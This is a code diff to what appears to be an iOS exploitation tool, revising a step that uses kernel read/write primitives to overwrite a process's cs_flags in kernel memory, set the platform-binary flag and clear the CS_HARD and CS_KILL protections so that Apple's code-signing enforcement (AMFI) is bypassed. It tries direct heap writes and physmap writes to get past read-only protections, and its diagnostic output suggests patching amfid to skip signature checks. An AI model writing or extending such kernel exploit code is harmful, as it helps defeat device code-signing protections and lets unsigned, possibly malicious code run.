@@ -6602,11 +6602,9 @@ struct AMFIExperimentView: View {
         }
         detail += "✅ Cross-verify OK — physmap VA menunjuk ke proc_ro yang benar\n\n"
 
-        // ── Step 6: Write cs_flags via physmap VA ────────────────────
-        detail += "=== Step 6: Write cs_flags via physmap ===\n"
+        // ── Step 6: Write cs_flags — direct heap KRW dulu, physmap sebagai fallback ──
+        detail += "=== Step 6: Write cs_flags ===\n"
 
-        // CS_VALID (0x1) | CS_PLATFORM_BINARY (0x100000)
-        // Hapus CS_HARD (0x40) dan CS_KILL (0x80) untuk mencegah SIGKILL saat exec
         let CS_VALID:           UInt32 = 0x00000001
         let CS_PLATFORM_BINARY: UInt32 = 0x00100000
         let CS_HARD:            UInt32 = 0x00000040
@@ -6619,12 +6617,25 @@ struct AMFIExperimentView: View {
         detail += "  - CS_HARD (0x40)\n"
         detail += "  - CS_KILL (0x80)\n\n"
 
-        // Write via physmap VA (bypass KTRR)
-        let writeOK = safeKwrite32Physmap(csFlagsPhysmapVA, newFlags)
-        guard writeOK else {
-            detail += "❌ safeKwrite32Physmap gagal — VA tidak aman\n"
-            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
-        }
+        // Attempt 1: Direct heap KRW write (sama seperti dspmgr.setCSFlags)
+        // proc_ro di zone allocator — ds_kwrite32 langsung ke heap VA
+        detail += "Attempt 1: direct heap KRW (ds_kwrite32)...\n"
+        ds_kwrite32(csFlagsVA, newFlags)
+        let afterAttempt1 = ds_kread32(csFlagsVA)
+        detail += "  cs_flags after heap write: 0x\(String(format: "%08x", afterAttempt1))\n"
+        let heapWriteOK = afterAttempt1 == newFlags
+
+        // Attempt 2: Physmap write (bypass zone RO protection jika ada)
+        detail += "Attempt 2: physmap write (safeKwrite32Physmap)...\n"
+        _ = safeKwrite32Physmap(csFlagsPhysmapVA, newFlags)
+        let afterAttempt2heap = ds_kread32(csFlagsVA)
+        let afterAttempt2phys = ds_kread32(csFlagsPhysmapVA)
+        detail += "  cs_flags after physmap write (heap read):   0x\(String(format: "%08x", afterAttempt2heap))\n"
+        detail += "  cs_flags after physmap write (physmap read): 0x\(String(format: "%08x", afterAttempt2phys))\n"
+        let physmapWriteOK = afterAttempt2heap == newFlags || afterAttempt2phys == newFlags
+
+        detail += "\nHeap write OK: \(heapWriteOK)\n"
+        detail += "Physmap write OK: \(physmapWriteOK)\n\n"
 
         // ── Step 7: Verify write ──────────────────────────────────────
         detail += "=== Step 7: Verify write ===\n"
@@ -6633,21 +6644,28 @@ struct AMFIExperimentView: View {
         detail += "cs_flags after (heap KRW):   0x\(String(format: "%08x", csFlagsAfterHeap))\n"
         detail += "cs_flags after (physmap VA): 0x\(String(format: "%08x", csFlagsAfterPhysmap))\n"
 
-        let writeVerified = csFlagsAfterPhysmap == newFlags || csFlagsAfterHeap == newFlags
+        let writeVerified = heapWriteOK || physmapWriteOK
         if writeVerified {
-            detail += "✅ Write berhasil! cs_flags diupdate via physmap.\n\n"
+            let finalFlags = csFlagsAfterHeap != csFlagsBefore ? csFlagsAfterHeap : csFlagsAfterPhysmap
+            detail += "✅ Write berhasil!\n\n"
             detail += "=== HASIL ===\n"
             detail += "Binary: \(targetBinary)\n"
             detail += "PID: \(targetPid)\n"
-            detail += "cs_flags: 0x\(String(format: "%08x", csFlagsBefore)) → 0x\(String(format: "%08x", csFlagsAfterPhysmap))\n"
-            detail += "CS_PLATFORM_BINARY: \(csFlagsAfterPhysmap & CS_PLATFORM_BINARY != 0 ? "✅ SET" : "❌ NOT SET")\n\n"
+            detail += "cs_flags: 0x\(String(format: "%08x", csFlagsBefore)) → 0x\(String(format: "%08x", finalFlags))\n"
+            detail += "CS_PLATFORM_BINARY: \(finalFlags & CS_PLATFORM_BINARY != 0 ? "✅ SET" : "❌ NOT SET")\n"
+            detail += "Metode: \(heapWriteOK ? "heap KRW" : "physmap")\n\n"
             detail += "→ Lanjut: jalankan ④ Test Binary Spawn untuk verifikasi AMFI bypass\n"
             detail += "→ Jika spawn berhasil tanpa SIGKILL = AMFI bypass confirmed!\n"
         } else {
-            detail += "❌ Write tidak terverifikasi.\n"
+            detail += "❌ Write tidak terverifikasi — proc_ro di-protect zone RO.\n"
             detail += "  Expected: 0x\(String(format: "%08x", newFlags))\n"
             detail += "  Got heap: 0x\(String(format: "%08x", csFlagsAfterHeap))\n"
-            detail += "  Got physmap: 0x\(String(format: "%08x", csFlagsAfterPhysmap))\n"
+            detail += "  Got physmap: 0x\(String(format: "%08x", csFlagsAfterPhysmap))\n\n"
+            detail += "Diagnosis:\n"
+            detail += "  proc_ro zone di iOS 18 di-protect hardware (zone_require_ro)\n"
+            detail += "  Physmap write juga tidak efektif — physical page read-only\n"
+            detail += "  Jalur selanjutnya: patch amfid memory untuk skip signature check\n"
+        }
             detail += "\nKemungkinan penyebab:\n"
             detail += "  1. gVirtBase tidak akurat → physmap VA salah\n"
             detail += "  2. proc_ro di RO zone (iOS 18 memprotect proc_ro)\n"
